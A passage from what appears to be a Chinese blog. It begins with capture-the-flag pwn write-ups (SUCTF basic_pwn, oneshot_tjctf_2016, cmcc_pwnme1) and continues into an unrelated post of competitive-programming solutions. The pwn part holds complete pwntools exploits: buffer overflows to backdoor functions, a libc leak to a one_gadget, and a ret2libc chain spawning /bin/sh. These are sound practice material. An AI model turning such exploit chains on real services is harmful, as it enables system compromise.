<h3 id="后门函数：-bin-cat"><a href="#后门函数：-bin-cat" class="headerlink" title="后门函数：/bin/cat"></a>后门函数：/bin/cat</h3><p>执行该函数能直接打印flag</p>
<p><img src="/2021/03/29/%C2%96buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%883%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210506154404324.png" alt="image-20210506154404324"></p>
<h3 id="完整exp-3"><a href="#完整exp-3" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">io = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">29307</span>)</span><br><span class="line">elf = ELF(<span class="string">'./SUCTF_2018_basic_pwn'</span>)</span><br><span class="line"><span class="comment"># io = process("./SUCTF_2018_basic_pwn")</span></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line">door = <span class="number">0x0000401157</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x110</span>+<span class="number">8</span>)+p64(door)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"> </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="oneshot-tjctf-2016"><a href="#oneshot-tjctf-2016" class="headerlink" title="oneshot_tjctf_2016"></a>oneshot_tjctf_2016</h2><p>程序流程是：可以泄漏一个地址，然后可以跳到任意一个地址</p>
<p><img src="/2021/03/29/%C2%96buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%883%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210506155959849.png" alt="image-20210506155959849"></p>
<p>方法：泄漏puts的got表地址，计算libc地址，然后跳到one_gadget即可。</p>
<h3 id="完整exp-4"><a href="#完整exp-4" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p=process("./oneshot_tjctf_2016")</span></span><br><span class="line">p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">27763</span>)</span><br><span class="line">elf=ELF(<span class="string">"./oneshot_tjctf_2016"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line"><span class="comment"># libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">p.recvuntil(<span class="string">"Read location?"</span>)</span><br><span class="line">p.sendline(str(puts_got))</span><br><span class="line">p.recvuntil(<span class="string">"Value: 0x"</span>)</span><br><span class="line">puts_addr = int(p.recv(<span class="number">16</span>).strip(),<span class="number">16</span>)</span><br><span class="line">log.success(hex(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line"><span class="comment"># onegadget = [0x45226,0x4527a,0xf0364,0xf1207]</span></span><br><span class="line">onegadget = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">p.recvuntil(<span class="string">"Jump location?"</span>)</span><br><span class="line">p.sendline(str(onegadget[<span class="number">0</span>]+libc_base))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="cmcc-pwnme1"><a href="#cmcc-pwnme1" class="headerlink" title="cmcc_pwnme1"></a>cmcc_pwnme1</h2><p>栈溢出</p>
<p><img src="/2021/03/29/%C2%96buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%883%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210506161229152.png" alt="image-20210506161229152"></p>
<p>有后门函数</p>
<p><img src="/2021/03/29/%C2%96buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%883%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210506161244074.png" alt="image-20210506161244074"></p>
<p>故得exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p=process("./pwnme1")</span></span><br><span class="line">p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">25575</span>)</span><br><span class="line">elf=ELF(<span class="string">"./oneshot_tjctf_2016"</span>)</span><br><span class="line"><span class="comment"># libc = ELF("./libc-2.23.so")</span></span><br><span class="line"><span class="comment"># libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line"></span><br><span class="line">get_flag = <span class="number">0x08048677</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; 6. Exit    "</span>)</span><br><span class="line">p.sendline(str(<span class="number">5</span>))</span><br><span class="line">p.recvuntil(<span class="string">"fruit:"</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0xa4</span>+<span class="number">4</span>)+p32(get_flag)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/2021/03/29/%C2%96buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%883%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210506161308542.png" alt="image-20210506161308542"></p>
<p>但是环境原因，flag在/home/ctf下面的flag或者flag.txt，所以没有拿到flag</p>
<h3 id="常规做法"><a href="#常规做法" class="headerlink" title="常规做法"></a>常规做法</h3><ol>
<li>泄漏libc地址</li>
<li>找到system和binsh</li>
<li>栈溢出</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p=process("./pwnme1")</span></span><br><span class="line">p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">25575</span>)</span><br><span class="line">elf=ELF(<span class="string">"./pwnme1"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.23-32.so"</span>)</span><br><span class="line"><span class="comment"># libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">get_fruit = <span class="number">0x08048624</span></span><br><span class="line"></span><br><span class="line">get_flag = <span class="number">0x08048677</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; 6. Exit    "</span>)</span><br><span class="line">p.sendline(str(<span class="number">5</span>))</span><br><span class="line">p.recvuntil(<span class="string">"fruit:"</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0xa4</span>+<span class="number">4</span>)+p32(puts_plt)+p32(get_fruit)+p32(puts_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">puts_addr = u32(p.recvuntil(<span class="string">"\xf7"</span>)[<span class="number">-4</span>:])</span><br><span class="line">log.success(hex(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">log.success(hex(system))</span><br><span class="line">log.success(hex(binsh))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"fruit:"</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0xa4</span>+<span class="number">4</span>)+p32(system)+p32(get_fruit)+p32(binsh)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


	
	</div>
  <a type="button" href="/2021/03/29/buu每日一题（3）/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/03/19/团体程序设计天梯赛-练习集/" >团体程序设计天梯赛-练习集</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-03-19  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<p>链接：<a href="https://pintia.cn/problem-sets/994805046380707840/problems/type/7" target="_blank" rel="noopener">团体程序设计天梯赛-练习集</a></p>
<h2 id="L1-006-连续因子"><a href="#L1-006-连续因子" class="headerlink" title="L1-006 连续因子"></a>L1-006 连续因子</h2><h3 id="序列最长长度"><a href="#序列最长长度" class="headerlink" title="序列最长长度"></a>序列最长长度</h3><p>因为n的取值范围：</p>
<p><img src="/2021/03/19/%E5%9B%A2%E4%BD%93%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E5%A4%A9%E6%A2%AF%E8%B5%9B-%E7%BB%83%E4%B9%A0%E9%9B%86/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210319111256733.png" alt="image-20210319111256733"></p>
<p>又因为最长序列为2×3×。。。n，也就是n的阶乘。</p>
<p>计算n的最长序列</p>
<p>发现13!&gt;n最大值，12!&lt;n的最大值，，，，又因为1不算，，，也就是2×3×…13也就是最长为12位。。。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by YCNN on 2021-03-19.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= <span class="number">13</span> ; ++i) &#123;</span><br><span class="line">        ans *= i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> pow2 = <span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">31</span>);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;pow2&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;结果</span><br><span class="line">13!:6227020800</span><br><span class="line">n的最大值:2147483648</span><br></pre></td></tr></table></figure>

<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>枚举所有的</p>
<ol>
<li>首先长度最长为12，从12开始减（依次枚举所有长度len的乘积【从2开始，，，】）</li>
<li>判断能否被n整除，如果可以的话，因为是从最大开始，这次就是最大值。</li>
</ol>
<h3 id="int取值范围"><a href="#int取值范围" class="headerlink" title="int取值范围"></a>int取值范围</h3><p>最大值：2^31-1</p>
<p>所以本次，，，n可以取int，但是ans可能超过int最大值，所以需要long long</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">max</span> = <span class="built_in">sqrt</span>(n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> len = <span class="number">12</span>; len &gt;= <span class="number">1</span> ; --len) &#123;<span class="comment">//最大长度为12，依次暴力所有的的长度情况</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> start = <span class="number">2</span>; start &lt;= <span class="built_in">max</span>; ++start) &#123;</span><br><span class="line">            ans = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = start; i &lt; start + len; ++i) &#123;</span><br><span class="line">                ans *= i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(n % ans == <span class="number">0</span>)&#123;<span class="comment">//如果是合法的</span></span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;len&lt;&lt;<span class="built_in">endl</span>&lt;&lt;start;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j = start+<span class="number">1</span>; j &lt; start+len; ++j) &#123;</span><br><span class="line">                    <span class="built_in">cout</span>&lt;&lt;<span class="string">"*"</span>&lt;&lt;j;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="number">1</span>&lt;&lt;<span class="built_in">endl</span>&lt;&lt;n&lt;&lt;<span class="built_in">endl</span>;<span class="comment">//如果是质数，，，因为最大也只是sqrt(n)，所以上面出不来结果，，，就手动加上来</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>其实是比较简单的题，，，但是上次做的时候，没有时间，紧张，就没有认真看下去，结果，，，校赛就出了一道类似的，苦苦。</p>
</blockquote>
<h2 id="L1-007-念数字"><a href="#L1-007-念数字" class="headerlink" title="L1-007 念数字"></a>L1-007 念数字</h2><blockquote>
<p>涉及字符串，，，使用java比较easy，，，</p>
<p>主要就是用map来存储，输入直接用字符串，，，</p>
</blockquote>
<h3 id="java版本"><a href="#java版本" class="headerlink" title="java版本"></a>java版本</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> exercise;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Ex_7</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		Map&lt;Character,String&gt; hashmap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">		hashmap.put(<span class="string">'0'</span>, <span class="string">"ling"</span>);</span><br><span class="line">		hashmap.put(<span class="string">'1'</span>, <span class="string">"yi"</span>);</span><br><span class="line">		hashmap.put(<span class="string">'2'</span>, <span class="string">"er"</span>);</span><br><span class="line">		hashmap.put(<span class="string">'3'</span>, <span class="string">"san"</span>);</span><br><span class="line">		hashmap.put(<span class="string">'4'</span>, <span class="string">"si"</span>);</span><br><span class="line">		hashmap.put(<span class="string">'5'</span>, <span class="string">"wu"</span>);</span><br><span class="line">		hashmap.put(<span class="string">'6'</span>, <span class="string">"liu"</span>);</span><br><span class="line">		hashmap.put(<span class="string">'7'</span>, <span class="string">"qi"</span>);</span><br><span class="line">		hashmap.put(<span class="string">'8'</span>, <span class="string">"ba"</span>);</span><br><span class="line">		hashmap.put(<span class="string">'9'</span>, <span class="string">"jiu"</span>);</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">		Scanner scan = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">		String s  = scan.next();</span><br><span class="line">		<span class="keyword">char</span>[] arr = s.toCharArray();</span><br><span class="line">		<span class="keyword">if</span>(s.length()==<span class="number">1</span>) &#123;</span><br><span class="line">			System.out.println(hashmap.get(arr[<span class="number">0</span>]));</span><br><span class="line">			<span class="keyword">return</span> ;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(hashmap.containsKey(arr[<span class="number">0</span>])) &#123;</span><br><span class="line">			System.out.print(hashmap.get(arr[<span class="number">0</span>])+<span class="string">" "</span>);</span><br><span class="line">		&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">			System.out.print(<span class="string">"fu "</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		String ans=<span class="string">""</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">			<span class="keyword">if</span>(hashmap.containsKey(arr[i])) &#123;</span><br><span class="line">				ans += hashmap.get(arr[i])+<span class="string">" "</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		ans = ans.substring(<span class="number">0</span>,ans.length()-<span class="number">1</span>);</span><br><span class="line">		System.out.println(ans);</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="c-版本"><a href="#c-版本" class="headerlink" title="c++版本"></a>c++版本</h3><blockquote>
<p>思路总体一样的</p>
<p>但看起来更简洁，，，<del>如果会写的话，，，TAT</del></p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by YCNN on 2021-03-19.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">map</span>&lt;<span class="keyword">char</span>,<span class="built_in">string</span>&gt; mmap;</span><br><span class="line">    mmap[<span class="string">'-'</span>] = <span class="string">"fu"</span>;</span><br><span class="line">    mmap[<span class="string">'0'</span>] = <span class="string">"ling"</span>;</span><br><span class="line">    mmap[<span class="string">'1'</span>] = <span class="string">"yi"</span>;</span><br><span class="line">    mmap[<span class="string">'2'</span>] = <span class="string">"er"</span>;</span><br><span class="line">    mmap[<span class="string">'3'</span>] = <span class="string">"san"</span>;</span><br><span class="line">    mmap[<span class="string">'4'</span>] = <span class="string">"si"</span>;</span><br><span class="line">    mmap[<span class="string">'5'</span>] = <span class="string">"wu"</span>;</span><br><span class="line">    mmap[<span class="string">'6'</span>] = <span class="string">"liu"</span>;</span><br><span class="line">    mmap[<span class="string">'7'</span>] = <span class="string">"qi"</span>;</span><br><span class="line">    mmap[<span class="string">'8'</span>] = <span class="string">"ba"</span>;</span><br><span class="line">    mmap[<span class="string">'9'</span>] = <span class="string">"jiu"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">string</span> s ;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;s;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; s.length()<span class="number">-1</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;mmap[s[i]]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;mmap[s[i]];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="L1-008-求整数段和"><a href="#L1-008-求整数段和" class="headerlink" title="L1-008 求整数段和"></a>L1-008 求整数段和</h2><blockquote>
<p><del>easy</del></p>
</blockquote>
<h3 id="每个数字占5个字符宽度"><a href="#每个数字占5个字符宽度" class="headerlink" title="每个数字占5个字符宽度"></a>每个数字占5个字符宽度</h3><p>使用格式化字符串 =&gt; <del>快乐</del></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"%5d"</span>,i);</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by YCNN on 2021-03-19.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span>  <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a,b;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;a&gt;&gt;b;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = a,len=<span class="number">1</span>; i &lt;= b ; ++i,len++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%5d"</span>,i);</span><br><span class="line">        sum += i;</span><br><span class="line">        <span class="keyword">if</span>(len % <span class="number">5</span> ==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            len = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>((b-a+<span class="number">1</span>)%<span class="number">5</span>==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"Sum = "</span>&lt;&lt;sum&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"\nSum = "</span>&lt;&lt;sum&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="L1-009-N个数求和"><a href="#L1-009-N个数求和" class="headerlink" title="L1-009 N个数求和"></a>L1-009 N个数求和</h2><blockquote>
<p>首先计算分数加法公式：</p>
